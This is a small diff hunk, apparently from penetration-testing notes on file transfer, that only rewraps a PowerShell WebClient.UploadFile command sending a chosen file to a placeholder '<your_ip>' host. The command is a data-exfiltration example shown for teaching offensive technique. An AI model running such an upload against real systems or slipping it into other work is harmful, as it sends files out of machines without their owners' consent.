@@ -45,5 +45,6 @@ capabilities. For instance, using Powershell's `System.Net.WebClient`:
 Alternatively, you can use:
 
 ```powershell
-(New-Object System.Net.WebClient).UploadFile('http://<your_ip>/', (Get-Item '<file_name>').FullName)
+(New-Object System.Net.WebClient).UploadFile(
+  'http://<your_ip>/', (Get-Item '<file_name>').FullName)
 ```
